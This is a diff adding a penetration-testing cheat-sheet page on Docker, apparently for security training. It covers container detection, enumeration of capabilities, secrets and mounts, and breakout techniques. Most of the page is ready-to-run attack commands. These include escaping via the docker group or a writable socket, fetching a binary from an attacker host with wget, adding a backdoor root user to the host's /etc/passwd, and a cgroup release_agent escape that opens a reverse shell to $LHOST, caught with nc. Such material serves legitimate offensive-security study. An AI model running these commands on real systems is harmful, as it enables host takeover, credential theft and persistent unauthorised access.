@@ -1,0 +1,235 @@
+---
+title: "Docker"
+---
+
+## Am I in a Container?
+
+```bash wrap
+# Every Docker container has this file at the root
+ls -la / | grep .dockerenv
+
+# cgroups path contains "docker"
+cat /proc/1/cgroup
+cat /proc/self/cgroup
+
+# Hostname is a short container ID hash
+hostname
+
+# systemd-detect-virt (if available)
+systemd-detect-virt --container
+```
+
+## Enumeration
+
+<AccordionGroup>
+  <Accordion title="Identity and User Context">
+    ```bash wrap
+    whoami; id
+    cat /etc/passwd
+    sudo -l
+    env
+    # Process 1 environment often leaks secrets and config
+    cat /proc/1/environ | tr '\0' '\n'
+    ```
+  </Accordion>
+  <Accordion title="Capabilities">
+    Capabilities determine what the container is allowed to do. A long list or `cap_sys_admin` means you have serious power.
+
+    ```bash wrap
+    # Human-readable capability listing
+    capsh --print
+
+    # Raw bitmask from procfs (works without capsh)
+    cat /proc/self/status | grep -i cap
+
+    # Key capabilities to look for:
+    # cap_sys_admin    -> cgroup abuse, mount, ptrace
+    # cap_net_admin    -> network manipulation
+    # cap_sys_ptrace   -> inject into host processes
+    # cap_dac_override -> read/write any file
+    # cap_setuid       -> call setuid(0)
+    ```
+  </Accordion>
+  <Accordion title="Privileged Container Check">
+    Privileged containers have all capabilities, seccomp disabled, and full access to host devices.
+
+    ```bash wrap
+    # seccomp: 0 in both fields = disabled (privileged)
+    cat /proc/1/status | grep -i seccomp
+
+    # AppArmor: file missing = no profile loaded
+    cat /sys/kernel/security/apparmor/profiles 2>/dev/null
+
+    # /dev: privileged containers expose host block devices
+    ls /dev
+
+    # If you can see block devices, you can mount the host filesystem
+    fdisk -l 2>/dev/null
+    df -h
+    ```
+  </Accordion>
+  <Accordion title="Network and Neighbors">
+    Docker's default bridge puts containers on `172.17.0.0/16`. Other containers are often reachable here.
+
+    ```bash wrap
+    ip a
+    ip route
+    cat /etc/hosts        # other containers often listed
+    cat /etc/resolv.conf  # DNS leaks internal service names
+
+    # Ping sweep the docker subnet for other containers
+    for i in $(seq 1 254); do
+        ping -c 1 -W 1 172.17.0.$i &>/dev/null && echo "172.17.0.$i UP" &
+    done; wait
+    ```
+  </Accordion>
+  <Accordion title="Mounts and Secrets">
+    Mounted volumes, bind mounts, and Docker secrets are common paths to host access or credentials.
+
+    ```bash wrap
+    # What is mounted into this container
+    cat /proc/mounts
+    mount
+
+    # Docker secrets land here
+    ls /run/secrets/ 2>/dev/null
+
+    # Look for mounted host paths or sensitive files
+    find / -name "docker-compose*" 2>/dev/null
+    find / -name "*.env" 2>/dev/null
+    find / -name "*.key" -o -name "*.pem" 2>/dev/null
+    ```
+  </Accordion>
+  <Accordion title="From the Host (docker group or socket access)">
+    ```bash wrap
+    # Find the socket if not at the default path
+    find / -name docker.sock 2>/dev/null
+    ls -la /var/run/docker.sock
+
+    docker ps -a
+    docker images
+    docker network ls
+    docker version
+    docker info
+
+    # Inspect a container: reveals env vars, mounts, network, and more
+    docker inspect $CONTAINER_ID
+    docker inspect $CONTAINER_ID | grep -i "env\|mount\|bind\|secret"
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Breakout Scenarios
+
+<AccordionGroup>
+  <Accordion title="Docker Group Membership">
+    Being in the `docker` group is effectively root. Mount the host filesystem into a container and chroot in.
+
+    ```bash wrap
+    id | grep docker
+    docker images
+
+    # Drop straight into a root shell on the host filesystem
+    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+    ```
+
+    Alternative: create a SUID bash binary via the mounted filesystem, then execute it on the host.
+
+    ```bash wrap
+    # Inside the container
+    cp /mnt/bin/bash /mnt/tmp/bash
+    chmod +s /mnt/tmp/bash
+
+    # On the host
+    /tmp/bash -p
+    ```
+  </Accordion>
+  <Accordion title="Writable Docker Socket">
+    If `/var/run/docker.sock` is writable, you can talk to the daemon directly without being in the docker group.
+
+    ```bash wrap
+    find / -name docker.sock 2>/dev/null
+    ls -la /var/run/docker.sock
+
+    # Download a static docker binary if docker CLI is not on the target
+    wget http://$LHOST/docker -O /tmp/docker
+    chmod +x /tmp/docker
+
+    # Spawn a privileged container with the host root mounted
+    /tmp/docker -H unix:///run/docker.sock run --rm -d --privileged -v /:/hostsystem alpine tail -f /dev/null
+    /tmp/docker -H unix:///run/docker.sock exec -it $CONTAINER_ID /bin/sh
+
+    # Now inside the container
+    chroot /hostsystem
+    ```
+  </Accordion>
+  <Accordion title="Privileged Container">
+    Privileged containers have all capabilities and can see host block devices. Mount the host drive and write to it directly.
+
+    ```bash wrap
+    # Confirm privileged: seccomp fields are 0, /dev is full
+    cat /proc/1/status | grep -i seccomp
+    fdisk -l
+
+    # Mount the host root partition (adjust device as needed)
+    mkdir -p /mnt/host
+    mount /dev/sda1 /mnt/host
+
+    # Add a root backdoor user
+    openssl passwd -1 -salt r00t password123
+    echo 'r00t:$1$r00t$HZoYdo0F7UZbuKrEXMcah0:0:0:root:/root:/bin/bash' >> /mnt/host/etc/passwd
+
+    # SSH in from attacker
+    ssh r00t@$TARGET
+    ```
+  </Accordion>
+  <Accordion title="CAP_SYS_ADMIN — Release Agent">
+    A non-privileged container with `CAP_SYS_ADMIN` and no AppArmor profile can abuse cgroup release agents to execute commands on the host.
+
+    ```bash wrap
+    # Confirm capability
+    capsh --print | grep sys_admin
+
+    # Set up cgroup structure
+    mkdir /tmp/cgrp
+    mount -t cgroup -o rdma cgroup /tmp/cgrp
+    mkdir /tmp/cgrp/x
+    echo 1 > /tmp/cgrp/x/notify_on_release
+
+    # Get the container's overlayfs path on the host
+    host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+    echo "$host_path/breakout" > /tmp/cgrp/release_agent
+
+    # Write the payload (executes on the host when a cgroup task exits)
+    echo '#!/bin/bash' > /breakout
+    echo 'bash -i >& /dev/tcp/$LHOST/443 0>&1' >> /breakout
+    chmod a+x /breakout
+
+    # Trigger: spawn a process in the cgroup and let it exit
+    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+    ```
+
+    Catch the shell on the attacker:
+
+    ```bash wrap
+    nc -lvnp 443
+    ```
+  </Accordion>
+  <Accordion title="sudo docker exec Misconfiguration">
+    If `sudo -l` shows `(root) NOPASSWD: /usr/bin/docker exec *`, you can exec into any running container as root.
+
+    ```bash wrap
+    sudo -l
+    # (root) NOPASSWD: /usr/bin/docker exec *
+
+    # Find a running container
+    ps -auxww | grep docker
+
+    # Exec in as root
+    sudo docker exec -it --user root $CONTAINER_ID /bin/bash
+
+    # Mount a host device from inside
+    mount /dev/xvda1 /tmp/data
+    ```
+  </Accordion>
+</AccordionGroup>
